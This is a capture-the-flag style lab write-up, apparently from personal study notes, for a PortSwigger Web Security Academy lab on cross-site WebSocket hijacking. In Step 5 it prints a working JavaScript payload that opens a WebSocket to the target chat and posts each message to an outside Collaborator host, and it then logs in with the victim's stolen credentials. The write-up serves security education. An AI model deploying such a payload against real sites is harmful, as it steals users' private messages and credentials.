# Lab 3 — Cross-site WebSocket hijacking

> [← Back to WebSockets](../README.md)

---

## 🎯 Objective
Perform a Cross-Site WebSocket Hijacking (CSWSH) attack to exfiltrate the victim's chat history containing their credentials, then login as the victim.

---

## 🪜 Steps

### Step 1 — Open Live Chat and send a message
Open the lab → click **Live Chat** → send: `hello`

> 📸 Screenshot: `./screenshots/step1-livechat.png`

---

### Step 2 — Identify WebSocket handshake
Go to **Burp → Proxy → HTTP history**.

Find the request:
```
GET /chat HTTP/1.1
Upgrade: websocket
```

> 📸 Screenshot: `./screenshots/step2-handshake.png`

---

### Step 3 — Copy the WebSocket URL
Right-click the handshake request → **Copy URL**.

Convert `https://` to `wss://`:
```
wss://YOUR-LAB-ID.web-security-academy.net/chat
```

Example from lab:
```
wss://0ab100fa04392e81808c03a400470081.web-security-academy.net/chat
```

> 📸 Screenshot: `./screenshots/step3-wsurl.png`

---

### Step 4 — Generate Burp Collaborator URL
Go to **Burp → Collaborator** → click **Copy to clipboard**.

Save your collaborator URL (e.g. `xxxx.oastify.com`).

> 📸 Screenshot: `./screenshots/step4-collaborator.png`

---

### Step 5 — Create exploit on Exploit Server
Go to the **Exploit Server**. In the body, paste:

```html
<script>
  var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR-ID.oastify.com', {
      method: 'POST',
      mode: 'no-cors',
      body: event.data
    });
  };
</script>
```

> 📸 Screenshot: `./screenshots/step5-exploit-server.png`

---

### Step 6 — Test the exploit
Click **View exploit**. Then go to **Burp → Collaborator → Poll now**.

Confirm the collaborator receives data.

> 📸 Screenshot: `./screenshots/step6-test.png`

---

### Step 7 — Deliver exploit to victim
Click **Deliver exploit to victim**.

Then again: **Burp → Collaborator → Poll now**.

You receive the victim's chat history containing their **credentials**.

> 📸 Screenshot: `./screenshots/step7-collaborator-data.png`

---

### Step 8 — Login as victim
Use the credentials found in the chat history to login.

> 📸 Screenshot: `./screenshots/step8-login.png`

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
WebSocket connections don't enforce CORS — they only check the `Origin` header during the handshake. If the server doesn't validate the origin, any malicious site can open a WebSocket on behalf of the victim and exfiltrate private data.
